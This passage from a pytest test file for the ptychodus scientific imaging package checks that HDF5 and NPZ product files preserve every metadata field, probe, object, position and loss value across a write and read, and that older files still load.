        file = tmp_path / 'product.h5'
        save_product(file, product)
        return load_product(file).metadata

    def test_converging_focus_survives(self, tmp_path: Path) -> None:
        metadata = self._round_trip(tmp_path, 5e-3)

        assert metadata.focus_object_distance_m == pytest.approx(5e-3)

    def test_diverging_focus_keeps_its_sign(self, tmp_path: Path) -> None:
        metadata = self._round_trip(tmp_path, -5e-3)

        assert metadata.focus_object_distance_m == pytest.approx(-5e-3)

    def test_file_without_the_attribute_still_loads(self, tmp_path: Path) -> None:
        """Products written before this field existed must keep loading.

        The fixture deletes the attribute from a freshly written file rather than
        hard-coding an old layout, so it cannot drift away from what save_product
        actually writes.
        """
        file = tmp_path / 'product.h5'
        save_product(file, _make_product())

        with h5py.File(file, 'r+') as h5_file:
            del h5_file.attrs[ProductFileKeys.FOCUS_OBJECT_DISTANCE]

        assert load_product(file).metadata.focus_object_distance_m == 0.0

    def test_npz_round_trip(self, tmp_path: Path) -> None:
        from ptychodus.plugins.npz_product_file import NPZProductFileIO

        product = _make_product()
        product = Product(
            metadata=replace(product.metadata, focus_object_distance_m=-2.5e-3),
            probe_positions=product.probe_positions,
            probes=product.probes,
            object_=product.object_,
            losses=product.losses,
        )
        file = tmp_path / 'product.npz'
        file_io = NPZProductFileIO()

        file_io.write(file, product)
        loaded = file_io.read(file)

        assert loaded.metadata.focus_object_distance_m == pytest.approx(-2.5e-3)


class TestTomographyAngleRoundTrip:
    """The angle identifies which projection a product is, so every writer must keep it.

    A tomographic solver reads a stack of products and needs each one's rotation angle;
    a writer that drops it turns the stack into an unordered pile. The canonical HDF5
    writer always kept it, but the NPZ writer omitted the very key its own reader looks
    for, and the CXI writer skipped it whenever it was zero.
    """

    ANGLE_DEG = -90.0461

    def _product(self, tomography_angle_deg: float) -> Product:
        product = _make_product()
        return Product(
            metadata=replace(product.metadata, tomography_angle_deg=tomography_angle_deg),
            probe_positions=product.probe_positions,
            probes=product.probes,
            object_=product.object_,
            losses=product.losses,
        )

    def test_hdf5_round_trip(self, tmp_path: Path) -> None:
        file = tmp_path / 'product.h5'
        save_product(file, self._product(self.ANGLE_DEG))

        assert load_product(file).metadata.tomography_angle_deg == pytest.approx(self.ANGLE_DEG)

    def test_npz_round_trip(self, tmp_path: Path) -> None:
        from ptychodus.plugins.npz_product_file import NPZProductFileIO

        file = tmp_path / 'product.npz'
        file_io = NPZProductFileIO()
        file_io.write(file, self._product(self.ANGLE_DEG))

        assert file_io.read(file).metadata.tomography_angle_deg == pytest.approx(self.ANGLE_DEG)

    def test_npz_keeps_a_zero_angle_distinguishable_from_a_missing_one(
        self, tmp_path: Path
    ) -> None:
        """Zero is a real angle -- the first projection of a tomogram -- not an absence."""
        from ptychodus.plugins.npz_product_file import NPZProductFileIO

        file = tmp_path / 'product.npz'
        file_io = NPZProductFileIO()
        file_io.write(file, self._product(0.0))

        with numpy.load(file) as npz_file:
            assert NPZProductFileIO.TOMOGRAPHY_ANGLE in npz_file


# ---------------------------------------------------------------------------
# Cross-format product round-trip
#
# Every format that both reads and writes a Product must preserve all of it.
# The metadata half is checked by introspecting the dataclass, so a field added
# to ProductMetadata fails here until each writer learns to persist it; the rest
# is checked explicitly below, since introspection does not reach it.
# ---------------------------------------------------------------------------


def _product_file_io() -> list[Any]:
    """The registered read+write product formats, imported lazily to keep this module light."""
    from ptychodus.plugins.h5_product_file import H5ProductFileIO
    from ptychodus.plugins.npz_product_file import NPZProductFileIO

    return [
        pytest.param(H5ProductFileIO(), '.h5', id='hdf5'),
        pytest.param(NPZProductFileIO(), '.npz', id='npz'),
    ]


PRODUCT_FILE_IO: Final = _product_file_io()

# One distinctive, non-default value per ProductMetadata field. Defaults are useless here:
# a writer that drops a field still round-trips its default, so every value must differ
# from what the dataclass would supply on its own.
DISTINCTIVE_METADATA: Final[dict[str, Any]] = {
    'name': 'round-trip product',
    'comments': 'every field set away from its default',
    'detector_distance_m': 2.25,
    'probe_energy_eV': 8551.0,
    # Fractional, and deliberately small: an int() cast anywhere in the path truncates
    # it. A realistic count like 1.3e8 would hide the same truncation, because dropping
    # 0.5 from it is a 4e-9 relative change and pytest.approx tolerates 1e-6 by default.
    'probe_photon_count': 1234.5,
    'exposure_time_s': 0.05,
    'mass_attenuation_m2_kg': 3.75,
    'tomography_angle_deg': -90.0461,
    'focus_object_distance_m': -2.5e-3,
    'tilt_angle_deg': 61.0,
    'polarization': Polarization.RIGHT_CIRCULAR,
}


def _round_trip_product(file_io: Any, path: Path, product: Product) -> Product:
    file_io.write(path, product)
    return file_io.read(path)


def test_distinctive_metadata_covers_every_field() -> None:
    """A field added to ProductMetadata must fail here until the writers persist it.

    Without this, a new field silently sits at its default on both sides of every
    round-trip test and nothing notices that no writer ever stored it.
    """
    assert set(DISTINCTIVE_METADATA) == {field.name for field in fields(ProductMetadata)}


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
@pytest.mark.parametrize('field_name', sorted(DISTINCTIVE_METADATA))
def test_metadata_field_round_trips(
    tmp_path: Path, file_io: Any, suffix: str, field_name: str
) -> None:
    metadata = ProductMetadata(**DISTINCTIVE_METADATA)
    product = _make_product(metadata=metadata)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)
    actual = getattr(loaded.metadata, field_name)
    expected = DISTINCTIVE_METADATA[field_name]

    if isinstance(expected, float):
        assert actual == pytest.approx(expected), field_name
    else:
        assert actual == expected, field_name


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_unpolarized_round_trips_as_none(tmp_path: Path, file_io: Any, suffix: str) -> None:
    """None is a real state, not a missing value, and must not come back as a default enum."""
    metadata = ProductMetadata(**{**DISTINCTIVE_METADATA, 'polarization': None})
    product = _make_product(metadata=metadata)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    assert loaded.metadata.polarization is None


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_position_photon_counts_round_trip(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(num_positions=4, with_position_photon_counts=True)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)
    counts = loaded.probe_positions.get_probe_photon_counts()

    assert counts is not None
    numpy.testing.assert_allclose(counts, product.probe_positions.get_probe_photon_counts())


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_absent_position_photon_counts_stay_absent(
    tmp_path: Path, file_io: Any, suffix: str
) -> None:
    """Unmeasured counts must come back as None, not as a column of zeros."""
    product = _make_product(with_position_photon_counts=False)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    assert loaded.probe_positions.get_probe_photon_counts() is None

    for point in loaded.probe_positions:
        assert point.probe_photon_count is None


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_probe_positions_round_trip(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(num_positions=4)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    numpy.testing.assert_array_equal(
        loaded.probe_positions.get_indexes(), product.probe_positions.get_indexes()
    )
    numpy.testing.assert_allclose(
        loaded.probe_positions.get_coordinates_x_m(),
        product.probe_positions.get_coordinates_x_m(),
    )
    numpy.testing.assert_allclose(
        loaded.probe_positions.get_coordinates_y_m(),
        product.probe_positions.get_coordinates_y_m(),
    )


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_probe_round_trips(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(with_opr=True)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    numpy.testing.assert_allclose(loaded.probes.get_array(), product.probes.get_array())
    assert loaded.probes.num_coherent_modes == product.probes.num_coherent_modes
    assert loaded.probes.num_incoherent_modes == product.probes.num_incoherent_modes

    # Compared against the source, not a literal: a writer that stores the object's pixel
    # size for the probe would satisfy a hardcoded assertion whenever the two agree.
    expected_geometry = product.probes.get_pixel_geometry()
    loaded_geometry = loaded.probes.get_pixel_geometry()
    assert loaded_geometry.width_m == pytest.approx(expected_geometry.width_m)
    assert loaded_geometry.height_m == pytest.approx(expected_geometry.height_m)

    numpy.testing.assert_allclose(loaded.probes.get_opr_weights(), product.probes.get_opr_weights())


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_absent_opr_weights_stay_absent(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(with_opr=False)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    assert loaded.probes.get_opr_weights_or_none() is None


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_object_round_trips(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(with_layer_spacing=True)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    numpy.testing.assert_allclose(loaded.object_.get_array(), product.object_.get_array())
    assert loaded.object_.num_layers == product.object_.num_layers
    numpy.testing.assert_allclose(loaded.object_.layer_spacing_m, product.object_.layer_spacing_m)

    expected_geometry = product.object_.get_geometry()
    loaded_geometry = loaded.object_.get_geometry()
    assert loaded_geometry.pixel_width_m == pytest.approx(expected_geometry.pixel_width_m)
    assert loaded_geometry.pixel_height_m == pytest.approx(expected_geometry.pixel_height_m)
    assert loaded_geometry.center_x_m == pytest.approx(expected_geometry.center_x_m)
    assert loaded_geometry.center_y_m == pytest.approx(expected_geometry.center_y_m)


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_losses_round_trip(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(with_losses=True)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    assert [loss.epoch for loss in loaded.losses] == [loss.epoch for loss in product.losses]
    assert [loss.value for loss in loaded.losses] == pytest.approx(
        [loss.value for loss in product.losses]
    )


@pytest.mark.parametrize(('file_io', 'suffix'), PRODUCT_FILE_IO)
def test_no_losses_round_trips_empty(tmp_path: Path, file_io: Any, suffix: str) -> None:
    product = _make_product(with_losses=False)

    loaded = _round_trip_product(file_io, tmp_path / f'product{suffix}', product)

    assert list(loaded.losses) == []


def test_formats_agree_with_each_other(tmp_path: Path) -> None:
    """The point of the alignment: one product, two formats, one result."""
    from ptychodus.plugins.h5_product_file import H5ProductFileIO
    from ptychodus.plugins.npz_product_file import NPZProductFileIO

    product = _make_product(
        metadata=ProductMetadata(**DISTINCTIVE_METADATA),
        with_opr=True,
        with_layer_spacing=True,
        with_losses=True,
        with_position_photon_counts=True,
    )

    from_h5 = _round_trip_product(H5ProductFileIO(), tmp_path / 'p.h5', product)
    from_npz = _round_trip_product(NPZProductFileIO(), tmp_path / 'p.npz', product)

    assert from_h5.metadata == from_npz.metadata
    numpy.testing.assert_allclose(
        from_h5.probe_positions.get_coordinates_x_m(),
        from_npz.probe_positions.get_coordinates_x_m(),
    )
    h5_counts = from_h5.probe_positions.get_probe_photon_counts()
    npz_counts = from_npz.probe_positions.get_probe_photon_counts()
    assert h5_counts is not None and npz_counts is not None
    numpy.testing.assert_allclose(h5_counts, npz_counts)
    numpy.testing.assert_allclose(from_h5.probes.get_array(), from_npz.probes.get_array())
    numpy.testing.assert_allclose(from_h5.object_.get_array(), from_npz.object_.get_array())


def test_legacy_npz_without_the_new_keys_still_loads(tmp_path: Path) -> None:
    """An archive written before tilt, polarization and per-position counts existed.

    Built key-by-key rather than by deleting from a fresh file, because an .npz is a zip
    and cannot have entries removed in place.
    """
    from ptychodus.plugins.npz_product_file import NPZProductFileIO

    file_io = NPZProductFileIO()
    file = tmp_path / 'legacy.npz'
    numpy.savez(
        file,
        **{
            NPZProductFileIO.DETECTOR_OBJECT_DISTANCE: 1.5,
            NPZProductFileIO.PROBE_ENERGY: 10_000.0,
            NPZProductFileIO.PROBE_POSITION_INDEXES: numpy.arange(2),
            NPZProductFileIO.PROBE_POSITION_X: numpy.zeros(2),
            NPZProductFileIO.PROBE_POSITION_Y: numpy.zeros(2),
            NPZProductFileIO.PROBE_ARRAY: numpy.zeros((1, 1, 4, 4), dtype=complex),
            NPZProductFileIO.OBJECT_ARRAY: numpy.zeros((1, 8, 8), dtype=complex),
            NPZProductFileIO.OBJECT_CENTER_X: 0.0,
            NPZProductFileIO.OBJECT_CENTER_Y: 0.0,
            NPZProductFileIO.OBJECT_PIXEL_WIDTH: 10e-9,
            NPZProductFileIO.OBJECT_PIXEL_HEIGHT: 10e-9,
        },
    )

    loaded = file_io.read(file)

    # Absent optional keys take the same defaults the HDF5 reader uses.
    assert loaded.metadata.name == 'Unnamed'
    assert loaded.metadata.comments == ''
    assert loaded.metadata.exposure_time_s == 0.0
    assert loaded.metadata.tilt_angle_deg == 0.0
    assert loaded.metadata.polarization is None
    assert loaded.probe_positions.get_probe_photon_counts() is None
    assert list(loaded.object_.layer_spacing_m) == []
    assert list(loaded.losses) == []
    # A probe with no pixel size of its own inherits the object's.
    assert loaded.probes.get_pixel_geometry().width_m == pytest.approx(10e-9)
